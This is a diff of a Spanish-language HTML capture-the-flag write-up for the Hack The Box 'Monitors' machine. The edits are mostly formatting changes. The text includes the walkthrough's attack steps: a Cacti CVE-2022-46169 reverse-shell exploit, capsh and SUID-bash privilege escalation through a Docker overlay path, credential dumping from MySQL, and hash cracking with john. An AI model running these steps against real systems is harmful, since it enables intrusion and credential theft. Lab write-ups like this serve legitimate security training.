@@ -83,7 +83,6 @@
                 </ul>
               </nav>
             </div>
-            <div class="navigation-wrapper">
               <div>
                 <nav class="cover-navigatio cover-navigation--primary">
                   <ul class="navigation">
@@ -92,7 +91,6 @@
                   </ul>
                 </nav>
               </div>
-            </div>
             
             <div><nav class="cover-navigation navigation--social">
     <ul class="navigation">
@@ -163,7 +161,7 @@
 <li><a href="#privesc">Escalada de privilegios en la maquina principal</a></li>
 </ul>
 <h2 id="Reconocimiento">Reconocimiento</h2>
-<p>Primero empezamos con el típico escaneo con nmap</p>
+<p>Primero empezamos con el típico escaneo con <code>nmap</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nmap -p- --open -T5 -sS -min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn -oG allports 10.10.11.211
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
@@ -208,9 +206,9 @@
 </span></span></code></pre></div><p>Ahora podemos ir a la pagina web que esta en el puerto 80</p>
 <p><img src="/htb/Monitors/images/1.png" alt="Monitor"></p>
 <h2 id="web">Explotación de la web</h2>
-<p>Podemos probar a hacer una SQLI pero veremos que no funcionara</p>
-<p>Pero en este panel podemos ver la version, podemos buscar vulnerabilidades para esta version de cacti</p>
-<p>Buscando encontré este proyecto, que usa una vulnerabilidad de esta version de cacti para mandarte una reverse shell</p>
+<p>Podemos probar a hacer una <code>SQLI</code> pero veremos que no funcionara</p>
+<p>Pero en este panel podemos ver la version, podemos buscar vulnerabilidades para esta version de <code>cacti</code></p>
+<p>Buscando encontré este proyecto, que usa una vulnerabilidad de esta version de <code>cacti</code> para mandarte una reverse shell</p>
 <p><strong>Proyecto</strong> &mdash;&gt; <a href="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/tree/main">https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/tree/main</a></p>
 <p>Usando esto podremos conseguir una consola interactiva de la maquina</p>
 <p>Primero que todo nos ponemos en escucha en el puerto que queramos</p>
@@ -222,23 +220,23 @@
 </span></span><span style="display:flex;"><span>The target is vulnerable. Exploiting...
 </span></span><span style="display:flex;"><span>Bruteforcing the host_id and local_data_ids
 </span></span><span style="display:flex;"><span>Bruteforce Success!!
-</span></span></code></pre></div><p>Ahora tenemos acceso a la consola, pero si hacemos un whoami podremos ver que estamos dentro de un Docker</p>
+</span></span></code></pre></div><p>Ahora tenemos acceso a la consola, pero si hacemos un whoami podremos ver que estamos dentro de un <code>Docker</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ whoami
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>www-data
 </span></span></code></pre></div><h2 id="docker">Escalada de privilegios en el docker</h2>
 <p>Ahora buscamos alguna manera de escalar privilegios,</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
-</span></span></code></pre></div><p>Encontramos un archivo llamado capsh, el cual podemos usar para convertirnos en root, de esta manera:</p>
+</span></span></code></pre></div><p>Encontramos un archivo llamado <code>capsh</code>, el cual podemos usar para convertirnos en root, de esta manera:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>capsh --gid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> --uid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> --
 </span></span></code></pre></div><h2 id="base_de_datos">Explotación de la base de datos</h2>
-<p>Una vez que tengamos root vamos a ir a la raiz y vamos a hacer un cat al archivo <strong>entrypoint.sh</strong></p>
+<p>Una vez que tengamos root vamos a ir a la raiz y vamos a hacer un cat al archivo <code>entrypoint.sh</code></p>
 <p>Este nos mostrara como entrar a la base de datos del servidor</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql --host<span style="color:#f92672">=</span>db --user<span style="color:#f92672">=</span>root --password<span style="color:#f92672">=</span>root cacti
-</span></span></code></pre></div><p>Al usar este comando entramos directamente a la base de datos cacti, por lo que no es necesario listar bases de datos</p>
-<p>Ahora podemos listar las tablas</p>
+</span></span></code></pre></div><p>Al usar este comando entramos directamente a la base de datos <code>cacti</code>, por lo que no es necesario listar bases de datos</p>
+<p>Ahora podemos listar las <code>tablas</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> MySQL <span style="color:#f92672">[(</span>cacti<span style="color:#f92672">)]</span>&gt; show tables;
-</span></span></code></pre></div><p>La que nos interesa es la user_auth</p>
+</span></span></code></pre></div><p>La que nos interesa es la <code>user_auth</code></p>
 <p>Si vemos su contenido obtendremos la contraseña del usuario para el ssh (la del root no funcionara)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>  ❯ MySQL <span style="color:#f92672">[</span>cacti<span style="color:#f92672">]</span>&gt; <span style="color:#66d9ef">select</span> username, password from user_auth;
 </span></span><span style="display:flex;"><span>  
@@ -252,14 +250,14 @@
 </span></span></code></pre></div><p>Ahora con john podemos desencriptar el hash (en el archivo hash tiene que estar el hash de marcus)</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/opt/rockyou.txt hash
 </span></span></code></pre></div><h2 id="privesc">Escalada de privilegios en la maquina principal</h2>
-<p>Ahora podemos conectarnos al usuario marcus con ssh, pero no cierres la consola del docker, se necesita mas adelante</p>
-<p>Ahora que estamos como usuario marcus podemos ver la flag del usuario, la cual estará en el home</p>
+<p>Ahora podemos conectarnos al usuario marcus con <code>ssh</code>, pero no cierres la consola del docker, se necesita mas adelante</p>
+<p>Ahora que estamos como usuario <code>marcus</code> podemos ver la flag del usuario, la cual estará en el home</p>
 <p><img src="/htb/Monitors/images/2.png" alt="Monitor"></p>
 <p>Perfecto, ahora toca ir a por la flag del root, para esto necesitaremos escalar privilegios, pero no hay ninguna manera a simple vista</p>
-<p>Por eso usaremos la terminal que tenemos en el docker con permisos root, y le daremos permisos a la bash</p>
+<p>Por eso usaremos la terminal que tenemos en el docker con permisos root, y le daremos permisos a la <code>bash</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod u+s /bin/bash 
 </span></span></code></pre></div><p>Pero le hemos dado permisos a la bash del contenedor y no de la maquina principal</p>
-<p>Por lo que con el usuario Marcus tenemos que irnos a esta ruta</p>
+<p>Por lo que con el usuario <code>Marcus</code> tenemos que irnos a esta ruta</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
 </span></span></code></pre></div><p>Y cuando estemos ahí ejecutamos la bash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bin/bash -p
